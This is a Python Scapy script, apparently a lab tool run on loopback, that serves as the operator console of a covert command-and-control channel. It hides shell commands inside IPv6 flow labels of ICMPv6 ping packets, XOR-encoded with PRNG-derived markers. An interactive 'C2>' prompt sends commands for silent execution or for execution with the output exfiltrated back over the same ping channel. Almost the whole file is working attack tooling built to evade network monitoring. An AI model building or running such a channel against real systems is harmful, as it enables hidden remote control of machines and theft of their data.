from scapy.all import *
import time
import sys
import random

TARGET_IP = "::1"  
INTERFACE = "lo0"       
SEED_VAL = 1114         
ENCRYPTION_KEY = 0x55  
SYNC_ID = 4095          

random.seed(SEED_VAL)
is_listening = False

def flush_buffer(pkt):
    """Dummy function to quietly drop stale packets from the OS buffer =)))))"""
    pass

# Called for each sniffed packet when in listener mode. It checks if the packet is part of the exfiltration stream and if so, decrypts and prints the character.
def handle_response(pkt):
    global is_listening
    
    # Only process ICMPv6 Echo Requests
    if not pkt.haslayer(ICMPv6EchoRequest): 
        return
    # Only process packets with IPv6 layer
    if pkt.haslayer(IPv6):
        flow_label = pkt[IPv6].fl
        received_magic = flow_label >> 8
        # Catch burst of SYNC packets to initialize PRNG state and reset command buffer
        if received_magic == SYNC_ID:
            random.seed(SEED_VAL)
            return
            
        prng_state = random.getstate()
        expected_magic = random.randint(0, 4094)
        
        if received_magic == expected_magic:
            decrypted_char = chr((flow_label & 0xFF) ^ ENCRYPTION_KEY)
            
            if decrypted_char == "\x00":
                # EOF received, stop listening
                is_listening = False 
            else:
                sys.stdout.write(decrypted_char)
                sys.stdout.flush()
        else:
            random.setstate(prng_state)

# Stop filter function for sniff() to exit when is_listening becomes False
def stop_sniffer(pkt):
    global is_listening
    return not is_listening

def send_covert_traffic(cmd, trigger):
    global is_listening
    
    #clear out any stale packets stuck in the loopback interface from previous commands.
    print("[*] Flushing network buffer for stale packets...")
    sniff(filter="icmp6", prn=flush_buffer, store=0, iface=INTERFACE, timeout=1.0)

    # Send SYNC burst to initialize PRNG state on receiver and reset command buffer 
    for _ in range(3):
        sync_pkt = IPv6(dst=TARGET_IP, fl=(SYNC_ID << 8) | 0) / ICMPv6EchoRequest()
        send(sync_pkt, verbose=False)
        time.sleep(0.02)
    
    time.sleep(0.05)
    random.seed(SEED_VAL)
    
    full_message = cmd + trigger
    print(f"[*] Target: {TARGET_IP}")
    print(f"[*] Sending Command: '{cmd}'")
    
    for char in full_message:
        magic_id = random.randint(0, 4094)
        encrypted_char = ord(char) ^ ENCRYPTION_KEY
        
        # Pack: [ Magic Number (12 bits) ] + [ Encrypted Char (8 bits) ]
        flow_label_val = (magic_id << 8) | encrypted_char
        pkt = IPv6(dst=TARGET_IP, fl=flow_label_val) / ICMPv6EchoRequest()
        
        send(pkt, verbose=False)
        time.sleep(0.02)
        
    print("\n[+] Command transmitted successfully.")
    
    # If trigger is '!', switch to listener mode to capture exfiltrated output
    if trigger == "!":
        print("[*] Switching to listener mode. Awaiting exfiltration...\n")
        print("-" * 40)
        is_listening = True
        
        random.seed(SEED_VAL)
        sniff(filter="icmp6", prn=handle_response, stop_filter=stop_sniffer, store=0, iface=INTERFACE, timeout=60)
        print("\n" + "-" * 40)
        print("[+] Exfiltration capture complete.")

if __name__ == "__main__":
    print("--- C2 Controller---")
    print("Use ';' for silent execution.")
    print("Use '!' to execute and exfiltrate output.\n")
    
    while True:
        try:
            # Get user input command
            user_input = input("C2> ")
            if not user_input: continue
            if user_input.lower() in ['exit', 'quit']: break
            
            # Determine trigger based on user input format
            if user_input.endswith(';') or user_input.endswith('!'):
                trigger = user_input[-1]
                cmd = user_input[:-1]
            else:
                trigger = "!"
                cmd = user_input
                
            send_covert_traffic(cmd, trigger)
            
        except KeyboardInterrupt:
            print("\nExiting...")
            break
